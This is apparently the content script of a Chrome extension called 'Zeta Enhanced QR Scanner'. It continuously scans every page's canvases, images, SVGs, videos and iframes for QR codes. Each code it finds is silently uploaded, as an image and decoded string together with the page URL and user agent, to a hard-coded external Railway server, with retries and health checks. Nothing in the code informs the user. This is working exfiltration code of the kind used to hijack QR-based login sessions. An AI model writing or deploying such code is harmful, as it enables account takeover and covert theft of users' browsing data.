// ZETA ENHANCED QR SCANNER - MAXIMUM POWER VERSION
// Enhanced Content Script for Railway Server with advanced stability features

// Server configuration - using different variable name to avoid conflicts
const ZETA_RAILWAY_SERVER = 'https://web-production-72c0d.up.railway.app/';
let lastQR = null;
let consecutiveFailures = 0;
let isConnected = true;
let scanInterval = 2000;
let retryTimeout = null;

// Safe message sending with error handling
function safeSendMessage(message) {
  try {
    if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
      chrome.runtime.sendMessage(message).catch(err => {
        console.log('[Zeta QR] ⚠️ Background message failed:', err);
      });
    }
  } catch (error) {
    console.log('[Zeta QR] ⚠️ Extension context error:', error);
  }
}

// Enhanced QR detection with multiple methods
function scanForQR() {
  const jsQR = window.jsQR;
  if (!jsQR) {
    console.log('[Zeta QR] jsQR not loaded, retrying...');
    return;
  }

  // Multiple scanning strategies
  const scanStrategies = [
    () => scanCanvasElements(),
    () => scanImageElements(), 
    () => scanSVGElements(),
    () => scanVideoElements(),
    () => scanIframeElements()
  ];

  for (const strategy of scanStrategies) {
    try {
      strategy();
    } catch (e) {
      console.log('[Zeta QR] Strategy error:', e);
    }
  }
}

function scanCanvasElements() {
  const canvases = document.querySelectorAll('canvas');
  for (const canvas of canvases) {
    if (!canvas.width || !canvas.height) continue;
    try {
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const code = jsQR(imageData.data, imageData.width, imageData.height);
      if (code && code.data && code.data !== lastQR) {
        handleQRFound(code.data, canvas.toDataURL('image/png'));
      }
    } catch (e) {
      // ignore canvas errors
    }
  }
}

function scanImageElements() {
  const images = document.querySelectorAll('img');
  for (const img of images) {
    if (!img.complete || !img.naturalWidth) continue;
    try {
      const canvas = document.createElement('canvas');
      canvas.width = img.naturalWidth;
      canvas.height = img.naturalHeight;
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      ctx.drawImage(img, 0, 0);
      
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const code = jsQR(imageData.data, imageData.width, imageData.height);
      if (code && code.data && code.data !== lastQR) {
        handleQRFound(code.data, canvas.toDataURL('image/png'));
      }
    } catch (e) {
      // ignore image errors
    }
  }
}

function scanSVGElements() {
  const svgs = document.querySelectorAll('svg');
  for (const svg of svgs) {
    try {
      const svgData = new XMLSerializer().serializeToString(svg);
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      const img = new Image();
      
      const svgBlob = new Blob([svgData], {type: 'image/svg+xml'});
      const url = URL.createObjectURL(svgBlob);
      
      img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
        
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const code = jsQR(imageData.data, imageData.width, imageData.height);
        if (code && code.data && code.data !== lastQR) {
          handleQRFound(code.data, canvas.toDataURL('image/png'));
        }
        URL.revokeObjectURL(url);
      };
      
      img.src = url;
    } catch (e) {
      // ignore SVG errors
    }
  }
}

function scanVideoElements() {
  const videos = document.querySelectorAll('video');
  for (const video of videos) {
    if (video.readyState < 2) continue; // not enough data
    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      ctx.drawImage(video, 0, 0);
      
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const code = jsQR(imageData.data, imageData.width, imageData.height);
      if (code && code.data && code.data !== lastQR) {
        handleQRFound(code.data, canvas.toDataURL('image/png'));
      }
    } catch (e) {
      // ignore video errors
    }
  }
}

function scanIframeElements() {
  const iframes = document.querySelectorAll('iframe');
  for (const iframe of iframes) {
    try {
      if (iframe.contentDocument) {
        const iframeImages = iframe.contentDocument.querySelectorAll('img');
        for (const img of iframeImages) {
          if (!img.complete || !img.naturalWidth) continue;
          const canvas = document.createElement('canvas');
          canvas.width = img.naturalWidth;
          canvas.height = img.naturalHeight;
          const ctx = canvas.getContext('2d', { willReadFrequently: true });
          ctx.drawImage(img, 0, 0);
          
          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          const code = jsQR(imageData.data, imageData.width, imageData.height);
          if (code && code.data && code.data !== lastQR) {
            handleQRFound(code.data, canvas.toDataURL('image/png'));
          }
        }
      }
    } catch (e) {
      // ignore iframe errors (cross-origin)
    }
  }
}

function handleQRFound(qrData, base64Image) {
  lastQR = qrData;
  console.log('[Zeta QR] 🔥 FOUND QR CODE:', qrData.substring(0, 100));
  
  // Reset failure counter on success
  consecutiveFailures = 0;
  scanInterval = Math.max(1000, scanInterval - 100); // Speed up on success
  
  // Notify background script safely
  safeSendMessage({
    type: 'QR_FOUND',
    qrData: qrData.substring(0, 100),
    timestamp: Date.now()
  });
  
  sendQRToServer(base64Image, qrData);
}

// Enhanced server communication with retry logic
function sendQRToServer(base64Image, qrString = null) {
  const payload = {
    qrData: base64Image,
    qrString: qrString,
    timestamp: Date.now(),
    userAgent: navigator.userAgent,
    url: window.location.href
  };

  console.log('[Zeta QR] 📤 Sending QR to server...');
  console.log('[Zeta QR] 📊 Payload size:', JSON.stringify(payload).length, 'bytes');
  console.log('[Zeta QR] 🔗 Server URL:', ZETA_RAILWAY_SERVER + 'api/qr');

  fetch(ZETA_RAILWAY_SERVER + 'api/qr', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload),
    mode: 'cors',
    credentials: 'omit'
  })
  .then(async response => {
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    const respText = await response.text();
    console.log('[Zeta QR] ✅ Server response:', respText);
    
    // Success - reset everything
    consecutiveFailures = 0;
    isConnected = true;
    scanInterval = 2000;
    
    // Notify background script of success safely
    safeSendMessage({
      type: 'QR_SENT_SUCCESS',
      timestamp: Date.now()
    });
    
    // Clear any pending retry
    if (retryTimeout) {
      clearTimeout(retryTimeout);
      retryTimeout = null;
    }
  })
  .catch(error => {
    console.log('[Zeta QR] ❌ Server error:', error);
    console.log('[Zeta QR] 🔍 Error details:', {
      name: error.name,
      message: error.message,
      stack: error.stack
    });
    consecutiveFailures++;
    
    // Notify background script of failure safely
    safeSendMessage({
      type: 'QR_SENT_FAILED',
      error: error.message,
      timestamp: Date.now()
    });
    
    // Adaptive retry logic
    if (consecutiveFailures >= 3) {
      isConnected = false;
      scanInterval = Math.min(10000, scanInterval + 1000); // Slow down on failures
    }
    
    // Retry with exponential backoff
    if (retryTimeout) clearTimeout(retryTimeout);
    retryTimeout = setTimeout(() => {
      console.log('[Zeta QR] 🔄 Retrying...');
      sendQRToServer(base64Image, qrString);
    }, Math.min(30000, 1000 * Math.pow(2, consecutiveFailures)));
  });
}

// Connection health check
function checkConnection() {
  console.log('[Zeta QR] 🔍 Checking server connection...');
  fetch(ZETA_RAILWAY_SERVER + 'health', { 
    method: 'GET',
    mode: 'cors',
    credentials: 'omit'
  })
    .then(response => {
      if (response.ok) {
        isConnected = true;
        consecutiveFailures = 0;
        console.log('[Zeta QR] ✅ Server connection healthy');
        return response.json();
      } else {
        throw new Error(`Health check failed: ${response.status}`);
      }
    })
    .then(data => {
      console.log('[Zeta QR] 📊 Server status:', data);
    })
    .catch(error => {
      console.log('[Zeta QR] ❌ Server health check failed:', error);
      isConnected = false;
    });
}

// Enhanced scanning with adaptive intervals
function startScanning() {
  if (!isConnected) {
    console.log('[Zeta QR] ⚠️ Server disconnected, slowing down...');
    scanInterval = 10000;
  }
  
  scanForQR();
  
  // Adaptive interval based on connection status
  setTimeout(startScanning, scanInterval);
}

// Initialize everything with error handling
try {
  console.log('[Zeta QR] 🚀 ENHANCED SCANNER INITIALIZED');
  console.log('[Zeta QR] Target server:', ZETA_RAILWAY_SERVER);
  console.log('[Zeta QR] Extension ID:', chrome.runtime?.id || 'unknown');
  console.log('[Zeta QR] Page URL:', window.location.href);

  // Start health checks every 30 seconds
  setInterval(checkConnection, 30000);

  // Initial health check
  checkConnection();

  // Test server connection with dummy QR after 5 seconds
  setTimeout(() => {
    console.log('[Zeta QR] 🧪 Testing server connection with dummy QR...');
    sendQRToServer('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'TEST_QR_FROM_ZETA');
  }, 5000);

  // Start scanning
  startScanning();

  // Listen for page changes (SPA support)
  let lastUrl = location.href;
  new MutationObserver(() => {
    const url = location.href;
    if (url !== lastUrl) {
      lastUrl = url;
      console.log('[Zeta QR] 📄 Page changed, resetting scanner');
      lastQR = null; // Reset QR cache on page change
    }
  }).observe(document, {subtree: true, childList: true});

} catch (error) {
  console.log('[Zeta QR] ❌ Initialization error:', error);
} 